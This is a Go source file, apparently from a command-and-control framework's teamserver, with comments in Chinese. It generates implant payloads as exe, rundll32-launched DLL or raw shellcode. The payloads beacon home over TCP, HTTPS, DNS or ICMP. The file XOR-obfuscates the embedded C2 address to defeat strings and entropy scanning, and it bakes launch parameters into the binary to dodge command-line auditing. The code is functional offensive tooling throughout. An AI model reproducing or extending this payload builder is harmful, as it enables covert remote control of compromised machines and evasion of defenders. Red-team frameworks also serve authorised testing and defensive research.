// Package artifact Artifact 生成器: 拼启动参数 + 调 Agent 构建 + 管密钥, 产出可执行 artifact。
// 三种形态: exe(直接运行) / dll(rundll32) / shc(裸 shellcode)。其中**现场编译路径为高级功能**,
// 默认关闭(需 -artifact-allow-compile); 常规出样本走 patch.go 的模板烧录(预编译 stub 烧块, 零编译)。
// 构建: vcvars64 + cmake configure(CLEAT_ENCRYPTION=ON)+ build Release; 产物 + 参数模板按时间戳归档。
// Agent 零改动(地址/密钥经运行期注入或配置块烧录)。
package artifact

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"cleat/teamserver/internal/crypto"
)

// Transport 传输模式。
type Transport string

const (
	TCP   Transport = "tcp"
	HTTPS Transport = "https"
	DNS   Transport = "dns"
	ICMP  Transport = "icmp"
)

// Spec 一次 generate 的参数(来自 CLI / profile), 决定产物形态与启动参数。
type Spec struct {
	Name         string `json:"name"`
	Form         string `json:"form"` // exe | dll(空=exe)
	Bake         bool   `json:"bake"` // 编译期烧参数(-DCLEAT_DEFAULT_*, 产物零参数运行, 防命令行审计)
	Transport    string `json:"transport"`
	Host         string `json:"host,omitempty"`
	Port         string `json:"port,omitempty"`
	URL          string `json:"url,omitempty"`
	UploadURL    string `json:"upload_url,omitempty"`
	DNSServer    string `json:"dns_server,omitempty"`
	Domain       string `json:"domain,omitempty"`
	ICMPTarget   string `json:"icmp_target,omitempty"`
	KeyMode      string `json:"key_mode"` // psk | x25519(空=默认 x25519)
	PSK          string `json:"psk,omitempty"`
	X25519Key    string `json:"x25519_key,omitempty"`    // server 私钥(hex), 未给时复用长期密钥对/新生成
	ServerPubkey string `json:"server_pubkey,omitempty"` // 注入 Agent --server-pubkey

	keyReused bool // 本次是否复用了 KeyStore 中的长期密钥对(不入 spec.json)
}

// applyDefaults 补全交付默认值: 未显式指定密钥模式时默认 x25519。
// 交付(Release)构建在 Agent 侧强制加密(AgentEntry.cpp fail-closed), 而 x25519 是唯一
// "样本内零秘密(只有公钥) + 可零参数上线"的组合; dev 需要离线解流量时显式 --key-mode psk。
func (s *Spec) applyDefaults() {
	if s.KeyMode == "" {
		s.KeyMode = "x25519"
	}
}

// resolveKeys 处理密钥: x25519 模式生成(或由私钥派生)server 密钥对; psk 校验非空。
func (s *Spec) resolveKeys() error {
	if s.KeyMode == "x25519" {
		if s.X25519Key == "" {
			priv, pub, err := crypto.GenerateX25519KeyPair()
			if err != nil {
				return err
			}
			s.X25519Key = priv
			s.ServerPubkey = pub
		} else if s.ServerPubkey == "" {
			xb, err := crypto.NewX25519(s.X25519Key)
			if err != nil {
				return err
			}
			s.ServerPubkey = xb.PublicKeyHex()
		}
	}
	return nil
}

// ---- 编译期烧录配置的 XOR 混淆块(敏感数据保护 Phase B1) ----
//
// 为什么: 把地址类字段以明文宏(-DCLEAT_DEFAULT_HOST="1.2.3.4")编进二进制, .rdata 直接可读,
// strings/熵扫描一抓一个准。改为打包成一个 XOR 块再烧, 样本内不再出现明文 C2。
//
// 块格式与掩码锁步于 Agent/Core/Config/StaticObfConfig.hpp(两处注释互指, 改动需同步):
//
//	[0..3] 魔数 "CSC1" | [4] 版本 1 | [5] 条目数 N
//	条目: [id 1B][len 2B 大端][bytes len]; id 见 obfID* 常量
//	整块 XOR obfMask[i%32] 后转小写 hex → 宏 CLEAT_DEFAULT_OBF
//
var obfMask = [32]byte{
	0x9E, 0x3B, 0x71, 0xC5, 0x02, 0xAD, 0x64, 0xF8,
	0x13, 0x5C, 0xE7, 0x28, 0x91, 0x4F, 0xB6, 0x0A,
	0xD3, 0x57, 0x1E, 0x82, 0x6C, 0xA9, 0x35, 0xF1,
	0x48, 0xCE, 0x7B, 0x94, 0x20, 0xE5, 0x6A, 0xB3,
}

// 条目 id, 与 Agent 侧解码 switch 锁步(解码侧遇未知 id 跳过, 保持前向兼容)。
const (
	obfIDTransport  = 1
	obfIDHost       = 2
	obfIDPort       = 3
	obfIDURL        = 4
	obfIDUploadURL  = 5
	obfIDDNSServer  = 6
	obfIDDNSDomain  = 7
	obfIDICMPTarget = 8
)

const (
	obfMagic     = "CSC1"
	obfVersion   = 1
	obfHeadLen   = 6
	obfMaxFields = 8
)

// obfField 一个待烧字段(id 决定 Agent 侧落到哪个配置域)。
type obfField struct {
	id    byte
	value string
}

// obfFields 按 id 升序给出待烧入的地址类字段(空值跳过)。
func (s *Spec) obfFields() []obfField {
	return []obfField{
		{obfIDTransport, s.Transport},
		{obfIDHost, s.Host},
		{obfIDPort, s.Port},
		{obfIDURL, s.URL},
		{obfIDUploadURL, s.UploadURL},
		{obfIDDNSServer, s.DNSServer},
		{obfIDDNSDomain, s.Domain},
		{obfIDICMPTarget, s.ICMPTarget},
	}
}

// obfEncode 打包地址类字段为混淆块 hex; 全部为空时返回 ""(不烧块 → 走内置默认/CLI)。
func obfEncode(fields []obfField) (string, error) {
	blob := []byte{obfMagic[0], obfMagic[1], obfMagic[2], obfMagic[3], obfVersion}
	n := 0
	for _, f := range fields {
		if f.value == "" {
			continue
		}
		if len(f.value) > 0xFFFF {
			return "", fmt.Errorf("烧录字段过长(id=%d, %d 字节)", f.id, len(f.value))
		}
		n++
	}
	if n == 0 {
		return "", nil
	}
	if n > obfMaxFields {
		return "", fmt.Errorf("烧录字段过多: %d", n)
	}

	blob = append(blob, byte(n))
	for _, f := range fields {
		if f.value == "" {
			continue
		}
		blob = append(blob, f.id, byte(len(f.value)>>8), byte(len(f.value)))
		blob = append(blob, f.value...)
	}
	for i := range blob {
		blob[i] ^= obfMask[i%len(obfMask)]
	}
	return hex.EncodeToString(blob), nil
}

// obfDecode 解回混淆块(生成器自检与测试用, Agent 侧对应实现见 StaticObfConfig.cpp)。
func obfDecode(hexStr string) (map[byte]string, error) {
	raw, err := hex.DecodeString(hexStr)
	if err != nil {
		return nil, fmt.Errorf("hex 非法: %w", err)
	}
	for i := range raw {
		raw[i] ^= obfMask[i%len(obfMask)]
	}
	if len(raw) < obfHeadLen || string(raw[:4]) != obfMagic {
		return nil, fmt.Errorf("魔数不符")
	}
	if raw[4] != obfVersion {
		return nil, fmt.Errorf("版本不识别: %d", raw[4])
	}

	out := make(map[byte]string, obfMaxFields)
	count := int(raw[5])
	off := obfHeadLen
	for i := 0; i < count; i++ {
		if off+3 > len(raw) {
			return nil, fmt.Errorf("条目头越界")
		}
		id := raw[off]
		l := int(raw[off+1])<<8 | int(raw[off+2])
		off += 3
		if off+l > len(raw) {
			return nil, fmt.Errorf("条目越界(id=%d)", id)
		}
		out[id] = string(raw[off : off+l])
		off += l
	}
	return out, nil
}

// obfBakeDef 打包地址类字段并回读自检, 返回宏值(空 = 无地址类字段)。
// 自检的意义: 块若编码有误, Agent 会静默回落内置默认地址 → 产物上线即失联,
// 且这类问题只在运行期暴露; 构建前解回比对可把它挡在烧录之前。
func (s *Spec) obfBakeDef() (string, error) {
	fields := s.obfFields()
	hexStr, err := obfEncode(fields)
	if err != nil {
		return "", err
	}
	if hexStr == "" {
		return "", nil
	}
	got, err := obfDecode(hexStr)
	if err != nil {
		return "", fmt.Errorf("烧录块自检失败: %w", err)
	}
	for _, f := range fields {
		if f.value != "" && got[f.id] != f.value {
			return "", fmt.Errorf("烧录块自检不一致(id=%d)", f.id)
		}
	}
	return hexStr, nil
}

// bakeDefs 把参数映射为编译期宏 CLEAT_DEFAULT_*(空值跳过, 匹配 Agent"空=不定义宏")。
// 地址类字段统一走 CLEAT_DEFAULT_OBF 混淆块, 不再逐个烧明文宏(Phase B1);
// 密钥类宏维持原样(PSK 由 A2 禁止烧入, 服务端公钥非秘密)。
// 需要 resolveKeys 已确定密钥(ServerPubkey/PSK)。
func (s *Spec) bakeDefs() (map[string]string, error) {
	defs := map[string]string{}
	blob, err := s.obfBakeDef()
	if err != nil {
		return nil, err
	}
	if blob != "" {
		defs["CLEAT_DEFAULT_OBF"] = blob
	}
	if s.PSK != "" {
		defs["CLEAT_DEFAULT_PSK"] = s.PSK
	}
	if s.ServerPubkey != "" {
		defs["CLEAT_DEFAULT_SERVER_PUBKEY"] = s.ServerPubkey
	}
	return defs, nil
}

// DeriveUploadURL 从 GET URL 推导 POST upload URL。
// 约定(与 server beacon 默认 poll_path/upload_path 锁步): URL 以 /beacon/poll 结尾
// 时, 上传帧必须走 /beacon/upload —— 否则 agent 会把 FirstConnect 等上报帧 POST 到
// Poll 路径, server 按探活静默丢弃, 导致"上线无确认/上报无声"(实测 )。
// 无法识别约定路径时返回空串(调用方不输出 --upload-url, 保持旧行为, 由操作员显式指定)。
func DeriveUploadURL(url string) string {
	const pollSuffix = "/beacon/poll"
	const uploadPath = "/beacon/upload"
	if strings.HasSuffix(url, pollSuffix) {
		return url[:len(url)-len(pollSuffix)] + uploadPath
	}
	return ""
}

// Args 生成 Agent 启动参数模板。
func (s Spec) Args() ([]string, error) {
	out := []string{"--transport", s.Transport}
	switch Transport(s.Transport) {
	case TCP:
		if s.Host == "" || s.Port == "" {
			return nil, fmt.Errorf("tcp 模式需要 --host 与 --port")
		}
		out = append(out, "--host", s.Host, "--port", s.Port)
	case HTTPS:
		if s.URL == "" {
			return nil, fmt.Errorf("https 模式需要 --url")
		}
		out = append(out, "--url", s.URL)
		// 未显式给 upload-url 时按 beacon 默认约定推导(见 DeriveUploadURL 注释)
		up := s.UploadURL
		if up == "" {
			up = DeriveUploadURL(s.URL)
		}
		if up != "" {
			out = append(out, "--upload-url", up)
		}
	case DNS:
		if s.DNSServer == "" || s.Domain == "" {
			return nil, fmt.Errorf("dns 模式需要 --dns-server 与 --domain")
		}
		out = append(out, "--dns-server", s.DNSServer, "--domain", s.Domain)
	case ICMP:
		if s.ICMPTarget == "" {
			return nil, fmt.Errorf("icmp 模式需要 --icmp-target")
		}
		out = append(out, "--icmp-target", s.ICMPTarget)
	default:
		return nil, fmt.Errorf("未知传输模式 %q", s.Transport)
	}
	switch s.KeyMode {
	case "", "psk":
		if s.PSK == "" {
			return nil, fmt.Errorf("psk 模式需要 --psk(64 位 hex 或在 TEAMSERVER 用 -psk 的一致密钥)")
		}
		out = append(out, "--psk", s.PSK)
	case "x25519":
		if s.ServerPubkey == "" {
			return nil, fmt.Errorf("x25519 模式需要注入 --server-pubkey(运行 generate 前先生成/指定)")
		}
		out = append(out, "--server-pubkey", s.ServerPubkey)
	default:
		return nil, fmt.Errorf("未知密钥模式 %q", s.KeyMode)
	}
	return out, nil
}

// Result 是一次 generate 的产物信息。
type Result struct {
	Name      string   `json:"name"`
	Form      string   `json:"form"` // exe | dll
	BinPath   string   `json:"bin_path"`
	RunLine   string   `json:"run_line"` // 完整启动命令(含 exe/rundll32 前缀)
	Args      []string `json:"args"`
	ArgLine   string   `json:"arg_line"`
	X25519Key string   `json:"x25519_key,omitempty"` // x25519 模式生成的 server 私钥(供 TeamServer -x25519-key)
	PubKey    string   `json:"server_pubkey,omitempty"`
	KeyReused bool     `json:"key_reused,omitempty"` // true=复用了长期密钥对(非本次新生成)
	KeyStore  string   `json:"key_store,omitempty"`  // 长期密钥对落盘路径(供运维接管)
	Warnings  []string `json:"warnings,omitempty"`   // 产物自检的非阻断告警
	BuiltAt   string   `json:"built_at"`
}

// PayloadEntry 已生成产物的一条清单项(扫 OutRoot 得出, 供 /api/payloads 列表)。
type PayloadEntry struct {
	Name    string `json:"name"`
	Form    string `json:"form"`
	Size    int64  `json:"size"`
	BuiltAt string `json:"built_at"`
}

// Generator 构建 artifact 的环境配置(路径可注入便于测试)。
type Generator struct {
	AgentDir     string // Agent 源码根(abs)
	VcvarsBat    string // vcvars64.bat 路径
	OutRoot      string // 产物父目录
	BuildDir     string // cmake 独立构建目录(默认 os.TempDir()/cleat-artifact-<ts>)
	KeyStore     string // 长期 X25519 密钥对路径(默认 OutRoot/keys/x25519.json)
	CmakePath    string
	StubDir      string // 外部 stub 目录覆盖(空=仅 go:embed 内置; 供 NewStubRegistry 用)
	AllowCompile bool   // 是否启用现场编译路径(默认 false; Generate 在 false 时直接拒绝)
}

// keyStorePath 返回长期密钥对落盘路径。
func (g *Generator) keyStorePath() string {
	if g.KeyStore != "" {
		return g.KeyStore
	}
	return filepath.Join(g.OutRoot, "keys", "x25519.json")
}

// keyPairFile 长期密钥对文件(服务器属可信环境, 明文落盘但限 0600)。
type keyPairFile struct {
	X25519Key    string `json:"x25519_key"`
	ServerPubkey string `json:"server_pubkey"`
}

// loadStoredKeyPair 读长期密钥对; 缺失/损坏/私钥非法时 ok=false(调用方回落到新生成)。
// 公钥一律由私钥现场派生, 不信任文件里的冗余字段(防手改后与私钥不配对)。
func (g *Generator) loadStoredKeyPair() (string, string, bool) {
	data, err := os.ReadFile(g.keyStorePath())
	if err != nil {
		return "", "", false
	}
	var kp keyPairFile
	if err := json.Unmarshal(data, &kp); err != nil || len(kp.X25519Key) != 64 {
		return "", "", false
	}
	xb, err := crypto.NewX25519(kp.X25519Key)
	if err != nil {
		return "", "", false
	}
	return kp.X25519Key, xb.PublicKeyHex(), true
}

// saveStoredKeyPair 落盘长期密钥对(文件 0600, 目录 0700)。
func (g *Generator) saveStoredKeyPair(privHex, pubHex string) error {
	path := g.keyStorePath()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		return err
	}
	data, err := json.MarshalIndent(keyPairFile{X25519Key: privHex, ServerPubkey: pubHex}, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(path, data, 0o600)
}

// resolveKeys 处理密钥: x25519 且未显式给私钥时, 优先复用长期密钥对(首次自动生成并落盘),
// 使同一次部署的多个样本与 TeamServer 保持配对; 显式给私钥则只用 Spec 语义派生公钥。
func (g *Generator) resolveKeys(s *Spec) error {
	if s.KeyMode != "x25519" || s.X25519Key != "" {
		return s.resolveKeys()
	}
	if priv, pub, ok := g.loadStoredKeyPair(); ok {
		s.X25519Key, s.ServerPubkey, s.keyReused = priv, pub, true
		return nil
	}
	if err := s.resolveKeys(); err != nil {
		return err
	}
	return g.saveStoredKeyPair(s.X25519Key, s.ServerPubkey)
}

// ResolveLongTermPubkey 返回本环境长期 X25519 密钥对的公钥(hex)。
// 首次调用时若长期密钥对不存在则生成并落盘(0600), 使同一次部署的多个样本与 TeamServer
// 保持配对; 供生成器 x25519 模式在未显式给公钥时注入(service.GeneratePayload 复用)。
func (g *Generator) ResolveLongTermPubkey() (string, error) {
	if _, pub, ok := g.loadStoredKeyPair(); ok {
		return pub, nil
	}
	priv, pub, err := crypto.GenerateX25519KeyPair()
	if err != nil {
		return "", err
	}
	if err := g.saveStoredKeyPair(priv, pub); err != nil {
		return "", err
	}
	return pub, nil
}

// NewEnv 构造生成器环境(注入产物根与外部 stub 目录; 不再硬编码本机路径)。
func NewEnv(outRoot, stubDir string, allowCompile bool) *Generator {
	return &Generator{OutRoot: outRoot, StubDir: stubDir, AllowCompile: allowCompile}
}

// DefaultEnv 返回默认构建环境(向后兼容)。不再写入本机硬编码路径 ——
// 产物根/外部 stub 目录由 -artifact-out / -stub-dir 经 SetArtifact 注入(见 service.SetArtifact)。
func DefaultEnv() *Generator { return &Generator{} }

// verifyArtifact 产物自检(敏感数据保护 A2 + B1): 交付样本内不得出现任何秘密,
// 地址类字段经 CLEAT_DEFAULT_OBF 混淆块烧入后也不应再以明文出现。
// 硬失败: PSK 明文 / 服务端 X25519 私钥 / 烧参数模式下公钥未进产物
// (最后一项会让样本上线时被 Agent 侧 fail-closed 闸拒掉, 属"生成了个上不了线的样本")。
// 非阻断告警: 明文 C2 命中 —— B1 后正常应为空, 命中说明混淆未生效(或极短取值撞上了
// 二进制里的其它字符串), 所以只告警不阻断。
func (g *Generator) verifyArtifact(bin string, s *Spec) ([]string, error) {
	data, err := os.ReadFile(bin)
	if err != nil {
		return nil, fmt.Errorf("产物自检读取失败: %w", err)
	}
	if s.PSK != "" && bytes.Contains(data, []byte(s.PSK)) {
		return nil, fmt.Errorf("产物自检失败: 二进制内含 PSK 明文(--key-mode psk 配合 --bake 会把密钥编进 .rdata); 交付请用 --key-mode x25519, 或去掉 --bake 改运行期注入")
	}
	if s.X25519Key != "" && bytes.Contains(data, []byte(s.X25519Key)) {
		return nil, fmt.Errorf("产物自检失败: 二进制内含 X25519 服务端私钥(样本内只允许公钥)")
	}
	if !s.Bake {
		return nil, nil // 未烧参数: 地址/密钥均在 run.cmd 运行期注入, 二进制本就不含
	}
	var warns []string
	if s.KeyMode == "x25519" {
		if s.ServerPubkey == "" || !bytes.Contains(data, []byte(s.ServerPubkey)) {
			return nil, fmt.Errorf("产物自检失败: 烧参数模式下未在二进制内找到 --server-pubkey(样本将因缺少密钥被 Agent 拒绝建连)")
		}
	}
	// 与内置默认值相同的取值不能作为泄露证据: 那些字面量本来就编在 AgentConfig.hpp 里
	// (host=127.0.0.1 / port=4444), 与是否烧录无关 —— 否则用默认地址生成必然误报。
	for _, f := range []struct{ name, val, builtin string }{
		{"host", s.Host, "127.0.0.1"}, {"port", s.Port, "4444"},
		{"url", s.URL, ""}, {"domain", s.Domain, ""}, {"icmp_target", s.ICMPTarget, ""},
	} {
		if f.val == "" || f.val == f.builtin || !bytes.Contains(data, []byte(f.val)) {
			continue
		}
		warns = append(warns, fmt.Sprintf("产物内含明文 %s=%s(应已被 CLEAT_DEFAULT_OBF 混淆块消除, 命中说明混淆未生效)", f.name, f.val))
	}
	return warns, nil
}

// builtBin 在构建目录内定位刚构建的产物。
// cmake 输出布局随形态/生成器而变(VS 多配置: <BuildDir>/Release/CleatAgent.exe|dll;
// 历史上曾直接落在源码树 Build/ 根), 因此改为按目录扫描取最新同名文件。
func (g *Generator) builtBin(form string) (string, error) {
	name := "CleatAgent.exe"
	if form == "dll" {
		name = "CleatAgent.dll"
	}
	var newest string
	var newestMod time.Time
	// 不可读项跳过: 临时构建目录里存在大量中间产物/锁文件
	_ = filepath.Walk(g.BuildDir, func(p string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		if strings.EqualFold(info.Name(), name) && info.ModTime().After(newestMod) {
			newest, newestMod = p, info.ModTime()
		}
		return nil
	})
	if newest == "" {
		return "", fmt.Errorf("构建产物不存在: %s 未出现在构建目录 %s", name, g.BuildDir)
	}
	return newest, nil
}

// Generate 生成一个 artifact: 密钥处理 → 参数渲染 → 构建 → 产物自检 → 归档。
// form(exe|dll|shc) 控制构建形态与启动模板。
// shc = 按 DLL 构建(消除魔法静态的 TLS 依赖)后经 dll2shc 包装为裸字节。
func (g *Generator) Generate(s *Spec) (*Result, error) {
	// 现场编译为高级功能, 默认关闭: 常规出样本走模板烧录(零编译, 见 patch.go / service.GeneratePayload)。
	if !g.AllowCompile {
		return nil, fmt.Errorf("现场编译路径未启用(-artifact-allow-compile); 常规出样本请走 /api/payloads/generate(模板烧录)")
	}
	if s.Form == "" || s.Form == "exe" {
		s.Form = "exe"
	} else if s.Form != "dll" && s.Form != "shc" {
		return nil, fmt.Errorf("未知产物形态 %q(exe|dll|shc)", s.Form)
	}
	if s.Name == "" {
		s.Name = fmt.Sprintf("%s-%s", s.Transport, time.Now().Format("20060102-150405"))
	}
	s.applyDefaults()

	// 快速失败: psk 配合 --bake 必然把 PSK 明文写进 .rdata(交付样本零秘密的红线),
	// 先于构建拒绝, 免得白等一次编译; 真正判定仍以构建后的字节自检为准(verifyArtifact)。
	if s.Bake && s.KeyMode == "psk" {
		return nil, fmt.Errorf("--key-mode psk 配合 --bake 会把 PSK 明文编进 .rdata; 交付请用 x25519(样本内只留公钥), 或去掉 --bake 改运行期注入")
	}

	// 1. 密钥(x25519 默认复用长期密钥对)
	if err := g.resolveKeys(s); err != nil {
		return nil, err
	}

	// 2. 参数渲染(校验)
	args, err := s.Args()
	if err != nil {
		return nil, err
	}

	// 3. 构建(可选烧参数: 把地址/密钥编进二进制)
	var defs map[string]string
	if s.Bake {
		var err error
		if defs, err = s.bakeDefs(); err != nil {
			return nil, fmt.Errorf("烧参数失败: %w", err)
		}
	}
	// shc 形态: 按 DLL 构建(消除魔法静态的 TLS 依赖, R10b) → dll2shc 包装 → 自检
	if s.Form == "shc" {
		if err := g.build(true, defs, true); err != nil {
			return nil, fmt.Errorf("构建失败: %w", err)
		}
		dll, err := g.builtBin("dll")
		if err != nil {
			return nil, err
		}
		shcBin, shcHeader, shcDll, err := g.wrapShc(dll, s.Name)
		if err != nil {
			return nil, err
		}
		// 自检对 shc 字节重跑(公钥须在; PSK 明文不得在)
		warns, err := g.verifyArtifact(shcBin, s)
		if err != nil {
			return nil, err
		}
		if err := g.saveShc(s, shcBin, shcHeader, shcDll, args); err != nil {
			return nil, err
		}
		return &Result{
			Name: s.Name, Form: s.Form, BinPath: filepath.Join(g.OutRoot, s.Name, s.Name+"_shc.bin"),
			Args: args, ArgLine: strings.Join(args, " "),
			RunLine:   "拷贝到可执行内存, call 第 0 字节(仓库硬约定)",
			X25519Key: s.X25519Key, PubKey: s.ServerPubkey,
			KeyReused: s.keyReused, KeyStore: g.keyStorePath(), Warnings: warns,
			BuiltAt: time.Now().Format(time.RFC3339),
		}, nil
	}

	if err := g.build(s.Form == "dll", defs, false); err != nil {
		return nil, fmt.Errorf("构建失败: %w", err)
	}

	// 4. 定位产物(路径随 cmake 布局变化, 见 builtBin) + 归档(文件名随形态)
	binName := "CleatAgent.exe"
	if s.Form == "dll" {
		binName = "CleatAgent.dll"
	}
	bin, err := g.builtBin(s.Form)
	if err != nil {
		return nil, err
	}

	// 5. 产物自检(秘密不得进样本; 告警不阻断)
	warns, err := g.verifyArtifact(bin, s)
	if err != nil {
		return nil, err
	}

	if err := g.save(s, bin, args); err != nil {
		return nil, err
	}

	return &Result{
		Name: s.Name, Form: s.Form, BinPath: filepath.Join(g.OutRoot, s.Name, binName),
		Args: args, ArgLine: strings.Join(args, " "),
		RunLine:   runLine(s.Form, binName, args),
		X25519Key: s.X25519Key, PubKey: s.ServerPubkey,
		KeyReused: s.keyReused, KeyStore: g.keyStorePath(), Warnings: warns,
		BuiltAt: time.Now().Format(time.RFC3339),
	}, nil
}

// runLine 构造完整启动命令(含形态前缀)。
func runLine(form, binName string, args []string) string {
	argStr := strings.Join(args, " ")
	if form == "dll" {
		return "rundll32.exe " + binName + ",StartW " + argStr
	}
	return binName + " " + argStr
}

// buildScript 构造 vcvars64 + cmake configure + build Release 的批处理脚本内容。
// asDll 控制 CLEAT_AS_DLL; defs 为编译期烧参数宏(-Dkey=value), 空 map 不追加。
func (g *Generator) buildScript(asDll bool, defs map[string]string, noTLSSafeStatic bool) string {
	cmake := g.CmakePath
	if strings.TrimSpace(cmake) == "" {
		cmake = "cmake"
	}
	log := filepath.Join(g.BuildDir, "build.log")
	asDllFlag := "OFF"
	if asDll {
		asDllFlag = "ON"
	}
	noTLS := ""
	if noTLSSafeStatic {
		noTLS = " -DCLEAT_NO_TLS_SAFE_STATIC=off"
	}
	defFlags := ""
	keys := make([]string, 0, len(defs))
	for k := range defs {
		keys = append(keys, k)
	}
	sort.Strings(keys) // 确定性顺序
	for _, k := range keys {
		defFlags += " -D" + k + "=\"" + defs[k] + "\""
	}
	return "@echo off\r\n" +
		"call \"" + g.VcvarsBat + "\" >nul 2>&1\r\n" +
		// 防重蹈覆辙: 此前本串硬编码字面量 "cmake",
		// g.CmakePath 配置静默失效(变量从未拼入) —— 自定义 cmake 路径不生效。
		"\"" + cmake + "\" -S \"" + g.AgentDir + "\" -B \"" + g.BuildDir + "\" -DCLEAT_ENCRYPTION=ON -DCLEAT_AS_DLL=" + asDllFlag + " -DCMAKE_BUILD_TYPE=Release" + noTLS + defFlags + " > \"" + log + "\" 2>&1\r\n" +
		"cmake --build \"" + g.BuildDir + "\" --config Release >> \"" + log + "\" 2>&1\r\n" +
		"exit /b %ERRORLEVEL%\r\n"
}

// build 写一个批处理脚本(temp)再执行, 避免 exec.Command 单长串的转义问题。
// asDll=true 构建 DLL 形态; defs 为编译期烧参数宏。
func (g *Generator) build(asDll bool, defs map[string]string, noTLSSafeStatic bool) error {
	if g.BuildDir == "" {
		g.BuildDir = filepath.Join(os.TempDir(), "cleat-artifact-"+time.Now().Format("20060102-150405"))
	}
	script := filepath.Join(g.BuildDir, "build.cmd")
	if err := os.MkdirAll(g.BuildDir, 0o755); err != nil {
		return err
	}
	log := filepath.Join(g.BuildDir, "build.log")
	if err := os.WriteFile(script, []byte(g.buildScript(asDll, defs, noTLSSafeStatic)), 0o644); err != nil {
		return err
	}
	cmd := exec.Command("cmd", "/c", script)
	out, err := cmd.CombinedOutput()
	_ = out
	if err != nil {
		// 把日志尾部带回错误(在日志文件, 而非 stdout)
		logTail := ""
		if data, e := os.ReadFile(log); e == nil {
			logTail = truncate(extractTail(string(data)))
		}
		if logTail == "" {
			logTail = "无构建日志(脚本执行失败)"
		}
		return fmt.Errorf("exit=%v: %s", err, logTail)
	}
	return nil
}

// wrapShc 调 Tools/ShellcodeLoader/tools/dll2shc.py 把 DLL 包装为
// [boot][loader][PE] 裸字节(入口@0, 仓库硬约定), 产出 <name>_shc.bin/.h。
// 同时把中间 DLL 拷入 _shc_build 并返回其路径 —— saveShc 用它归档
// CleatAgent.dll(rundll32 直接验证用), 不依赖 builtBin 事后在 BuildDir 里
// 瞎找(此前 shc 归档漏 DLL 的根因: 中间产物未保留)。
// 依赖: python3 + MSVC 工具链(dll2shc 自行发现 vcvars)。
func (g *Generator) wrapShc(dll string, name string) (binPath, headerPath, dllCopy string, err error) {
	tool := filepath.Join(filepath.Dir(g.AgentDir), "Tools", "ShellcodeLoader", "tools", "dll2shc.py")
	if _, e := os.Stat(tool); e != nil {
		return "", "", "", fmt.Errorf("dll2shc.py 不存在: %w", e)
	}
	outDir := filepath.Join(g.OutRoot, "_shc_build")
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return "", "", "", err
	}
	cmd := exec.Command("python", tool, dll, "--name", name, "--out", outDir, "--force")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", "", "", fmt.Errorf("dll2shc 失败: %w: %s", err, truncate(string(out)))
	}
	bin := filepath.Join(outDir, name+".bin")
	hdr := filepath.Join(outDir, name+".h")
	if _, e := os.Stat(bin); e != nil {
		return "", "", "", fmt.Errorf("dll2shc 未产出 %s", bin)
	}
	// 中间 DLL 拷入 _shc_build(与 bin/h 同生命周期), 供归档与 rundll32 验证
	dllCopy = filepath.Join(outDir, "CleatAgent.dll")
	data, e := os.ReadFile(dll)
	if e != nil {
		return "", "", "", fmt.Errorf("读取中间 DLL 失败: %w", e)
	}
	if e := os.WriteFile(dllCopy, data, 0o755); e != nil {
		return "", "", "", fmt.Errorf("落中间 DLL 失败: %w", e)
	}
	return bin, hdr, dllCopy, nil
}

// saveShc 保存 shc 产物(.bin + .h C 数组 + 中间 DLL 供 rundll32 直接验证)与元信息。
func (g *Generator) saveShc(s *Spec, shcBin, shcHeader, dll string, args []string) error {
	dir := filepath.Join(g.OutRoot, s.Name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}
	for _, src := range []string{shcBin, shcHeader, dll} {
		data, err := os.ReadFile(src)
		if err != nil {
			return err
		}
		dst := filepath.Join(dir, filepath.Base(src))
		if err := os.WriteFile(dst, data, 0o644); err != nil {
			return err
		}
	}
	// dll 归档为 CleatAgent.dll(rundll32 验证用)
	dllData, err := os.ReadFile(dll)
	if err != nil {
		return err
	}
	if err := os.WriteFile(filepath.Join(dir, "CleatAgent.dll"), dllData, 0o755); err != nil {
		return err
	}
	run := "@echo off\r\nrem shc 形态: 拷贝 " + s.Name + "_shc.bin 到可执行内存, call 第 0 字节\r\n"
	if err := os.WriteFile(filepath.Join(dir, "run.cmd"), []byte(run), 0o644); err != nil {
		return err
	}
	js, _ := json.MarshalIndent(s, "", "  ")
	return os.WriteFile(filepath.Join(dir, "spec.json"), js, 0o644)
}

// extractTail 取多行文本最后 20 行(定位编译错误尾部)。
func extractTail(s string) string {
	lines := strings.Split(strings.ReplaceAll(s, "\r\n", "\n"), "\n")
	if len(lines) <= 20 {
		return s
	}
	return strings.Join(lines[len(lines)-20:], "\n")
}

// save 把产物 + 参数模板 + 元信息写入 OutRoot/<name>/。
func (g *Generator) save(s *Spec, bin string, args []string) error {
	dir := filepath.Join(g.OutRoot, s.Name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}
	binName := "CleatAgent.exe"
	if s.Form == "dll" {
		binName = "CleatAgent.dll"
	}
	// 复制产物
	dst := filepath.Join(dir, binName)
	data, err := os.ReadFile(bin)
	if err != nil {
		return err
	}
	if err := os.WriteFile(dst, data, 0o755); err != nil {
		return err
	}
	// 启动模板 run.cmd(exe 直接跑 / dll 用 rundll32)
	run := "@echo off\r\n" + runLine(s.Form, binName, args) + "\r\n"
	if err := os.WriteFile(filepath.Join(dir, "run.cmd"), []byte(run), 0o644); err != nil {
		return err
	}
	// 元信息 spec.json
	js, _ := json.MarshalIndent(s, "", "  ")
	return os.WriteFile(filepath.Join(dir, "spec.json"), js, 0o644)
}

// List 返回已生成 artifact 目录名。
func (g *Generator) List() ([]string, error) {
	ents, err := os.ReadDir(g.OutRoot)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, err
	}
	var out []string
	for _, e := range ents {
		if e.IsDir() {
			out = append(out, e.Name())
		}
	}
	return out, nil
}

func truncate(s string) string {
	const max = 4000
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}
